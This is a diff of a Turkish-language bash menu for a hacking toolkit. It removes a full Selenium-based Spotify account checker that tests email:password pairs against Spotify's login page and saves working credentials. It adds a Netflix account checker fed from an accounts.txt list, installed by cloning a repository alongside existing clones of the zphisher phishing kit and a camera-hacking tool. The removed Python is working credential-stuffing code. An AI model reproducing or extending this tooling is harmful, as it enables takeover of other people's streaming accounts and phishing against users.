@@ -47,7 +47,7 @@ menu() {
     echo -e "${R}[3]${W} Kamera Hack - (CamHack kurulu olmalı)"
     echo -e "${R}[4]${W} Güncel P4n4l"
     echo -e "${R}[5]${W} Spotify Checker [Aktif Değil]"
-    echo -e "${R}[6]${W} Ping Testi"
+    echo -e "${R}[6]${W} Netflix Checker (Aktif) accounts.txt"
     echo -e "${R}[7]${W} Traceroute"
     echo -e "${R}[8]${W} Port Tarama (Nmap)"
     echo -e "${R}[9]${W} Email Sorgulama"
@@ -62,107 +62,6 @@ menu() {
     echo -e "${R}[99]${W} Gerekli kütüphaneleri Yükle"
     echo -e "${R}[0]${W} Çıkış"
     echo
-}
-
-# Spotify Checker Online Python
-spotify_checker() {
-python3 - <<END
-import time
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import TimeoutException
-from rich.console import Console
-
-console = Console()
-
-console.print("[bold cyan][+]---Spotify Account Checker v2.1 (Konsol Girişi)---[+][/bold cyan]")
-console.print("[bold cyan][+]---Powered By Emin INC.--[+][/bold cyan]")
-
-valid_count = 0
-invalid_count = 0
-valid_accounts = []
-
-# --- Chrome Ayarları ---
-chrome_options = Options()
-chrome_options.add_argument("--headless=new")  # Headless modu aktif edildi
-chrome_options.add_argument("--disable-gpu")
-chrome_options.add_argument("--no-sandbox")
-chrome_options.add_argument("--log-level=3")
-chrome_options.add_argument(
-    "user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-    "AppleWebKit/537.36 (KHTML, like Gecko) "
-    "Chrome/120.0.0.0 Safari/537.36"
-)
-
-driver = webdriver.Chrome(options=chrome_options)
-wait = WebDriverWait(driver, 10)
-
-login_url = "https://accounts.spotify.com/us/login?login_hint=&allow_password=1&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F%3Fflow_ctx%3D48f0092f-1b88-4241-850e-c69c1dd12d46%3A1753854776&flow_ctx=48f0092f-1b88-4241-850e-c69c1dd12d46%3A1753854776"
-
-def check_account(email, password):
-    global valid_count, invalid_count
-    try:
-        driver.get(login_url)
-        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#login-username")))
-        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#login-password")))
-
-        # Alanlar doldur
-        email_field = driver.find_element(By.CSS_SELECTOR, "input#login-username")
-        password_field = driver.find_element(By.CSS_SELECTOR, "input#login-password")
-        email_field.clear()
-        password_field.clear()
-        email_field.send_keys(email)
-        password_field.send_keys(password)
-        time.sleep(1)  # İnsan gibi davranış
-        password_field.send_keys(Keys.RETURN)
-
-        try:
-            # Spotify ana sayfa yönlendirme kontrolü
-            wait.until(EC.url_contains("open.spotify.com"))
-            console.print(f"[bold green][+] {email}:{password} - Geçerli[/bold green]")
-            valid_accounts.append(f"{email}:{password}")
-            valid_count += 1
-        except TimeoutException:
-            console.print(f"[bold red][-] {email}:{password} - Geçersiz[/bold red]")
-            invalid_count += 1
-
-    except Exception as e:
-        console.print(f"[bold yellow]Hata: {e} - {email}:{password}[/bold yellow]")
-
-def check_accounts_console():
-    global valid_count, invalid_count
-    console.print("[bold cyan]Spotify Checker Konsol Girişi Aktif[/bold cyan]")
-    console.print("Format: email:password")
-    console.print("Çıkmak için 'q' girin.\n")
-
-    while True:
-        creds = input("Hesap (email:password): ").strip()
-        if creds.lower() == "q":
-            break
-        if ":" not in creds:
-            console.print("[bold yellow]Geçersiz format! email:password şeklinde girin.[/bold yellow]")
-            continue
-        email, password = creds.split(":", 1)
-        check_account(email, password)
-
-    console.print("[bold cyan]Geçerli hesaplar kaydediliyor...[/bold cyan]")
-    if valid_accounts:
-        with open("spotify_worksAcc.txt", "w") as outfile:
-            outfile.writelines(account + "\n" for account in valid_accounts)
-
-    console.print(f"\n[bold green]Geçerli hesaplar:[/bold green] {valid_count}")
-    console.print(f"[bold red]Geçersiz hesaplar:[/bold red] {invalid_count}")
-
-if __name__ == "__main__":
-    check_accounts_console()
-    driver.quit()
-    console.print("[bold magenta]Kontrol tamamlandı. Enter ile çıkış...[/bold magenta]")
-    input()
-END
 }
 
 # Ana döngü
@@ -199,10 +98,9 @@ while true; do
             spotify_checker
             ;;
         6)
-            read -p "Hedef IP veya domain: " target
-            ping -c 4 "$target"
-            read -p "Devam etmek için Enter..."
+        python3 ~/netflix_checker/netflix_checker.py
             ;;
+
         7)
             read -p "Hedef IP veya domain: " target
             traceroute "$target"
@@ -292,7 +190,8 @@ while true; do
             # Python kütüphaneleri
             pip3 install --upgrade pip
             pip3 install selenium rich
-            
+            pip3 install selenium rich requests
+
             # Reposlar
             if [ ! -d "$HOME/zphisher" ]; then
                 git clone https://github.com/htr-tech/zphisher.git "$HOME/zphisher"
@@ -305,7 +204,13 @@ while true; do
             else
                 echo -e "${C}Enough-Reborn zaten mevcut, atlanıyor.${W}"
             fi
-            
+
+             if [ ! -d "$HOME/netflix_checker" ]; then
+          git clone https://github.com/Em4nnn/xx2025xx.git "$HOME/netflix_checker"
+             else
+             echo -e "${C}Netflix Checker zaten mevcut, atlanıyor.${W}"
+           fi
+
             CAMHACK_REPO="https://github.com/username/CamHack.git"
             if [ ! -d "$HOME/CamHack" ]; then
                 git clone "$CAMHACK_REPO" "$HOME/CamHack"
